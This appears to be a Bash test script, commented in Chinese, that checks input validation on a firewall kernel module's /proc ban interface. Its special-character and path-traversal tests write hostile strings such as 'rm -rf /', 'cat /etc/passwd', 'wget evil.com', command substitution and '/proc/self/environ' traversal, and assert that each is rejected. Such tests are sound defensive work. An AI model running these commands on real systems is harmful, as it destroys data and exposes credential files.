#!/bin/bash
# 05_input_validation.sh - 输入验证测试

fw_test_header "输入验证测试"

fw_ensure_module_loaded "$KERNEL_MODULE_PATH"

# 5.1 无效 IP 格式
fw_subsection "无效 IP 格式"
assert_failure "echo '$INVALID_IP' > '$PROC_ADD_BAN' 2>&1" "无效 IP (999.999.999.999) 被拒绝"
assert_failure "echo 'abc.def.ghi.jkl' > '$PROC_ADD_BAN' 2>&1" "字母 IP 被拒绝"
assert_failure "echo '192.168.1' > '$PROC_ADD_BAN' 2>&1" "不完整 IP (192.168.1) 被拒绝"
assert_failure "echo '192.168.1.1.1' > '$PROC_ADD_BAN' 2>&1" "超额 IP (192.168.1.1.1) 被拒绝"

# 5.2 含字母 IP
assert_failure "echo '192.168.1.1a' > '$PROC_ADD_BAN' 2>&1" "含字母 IP 被拒绝"
assert_failure "echo '-1.1.1.1' > '$PROC_ADD_BAN' 2>&1" "负数 IP 被拒绝"
assert_failure "echo '256.0.0.1' > '$PROC_ADD_BAN' 2>&1" "超出范围 IP (256.0.0.1) 被拒绝"

# 5.3 超长输入
fw_subsection "超长输入 (缓冲区溢出)"
assert_failure "python3 -c \"print('A'*100)\" > '$PROC_ADD_BAN' 2>&1" "100 字符输入被拒绝"
assert_failure "python3 -c \"print('A'*1000)\" > '$PROC_ADD_BAN' 2>&1" "1000 字符输入被拒绝"

# 5.4 特殊字符
fw_subsection "特殊字符注入"
assert_failure "echo '192.168.1.1; rm -rf /' > '$PROC_ADD_BAN' 2>&1" "命令注入被拒绝"
assert_failure "echo '192.168.1.1 | cat /etc/passwd' > '$PROC_ADD_BAN' 2>&1" "管道注入被拒绝"
assert_failure "echo '192.168.1.1 && wget evil.com' > '$PROC_ADD_BAN' 2>&1" "逻辑运算符注入被拒绝"
assert_failure "echo '\$(whoami)' > '$PROC_ADD_BAN' 2>&1" "命令替换被拒绝"
assert_failure "echo '\`id\`' > '$PROC_ADD_BAN' 2>&1" "反引号命令替换被拒绝"

# 5.5 路径遍历
assert_failure "echo '../../etc/passwd' > '$PROC_ADD_BAN' 2>&1" "路径遍历被拒绝"
assert_failure "echo '../../../proc/self/environ' > '$PROC_ADD_BAN' 2>&1" "proc 遍历被拒绝"

# 5.6 有效边界 IP
fw_subsection "有效边界 IP"
assert_success "echo '1.0.0.1' > '$PROC_ADD_BAN' 2>/dev/null" "最小有效 IP (1.0.0.1) 被封禁"
echo "1.0.0.1" > "$PROC_REMOVE_BAN" 2>/dev/null || true

assert_success "echo '254.255.255.255' > '$PROC_ADD_BAN' 2>/dev/null" "最大有效单播 IP 被封禁"
echo "254.255.255.255" > "$PROC_REMOVE_BAN" 2>/dev/null || true

fw_ensure_module_unloaded
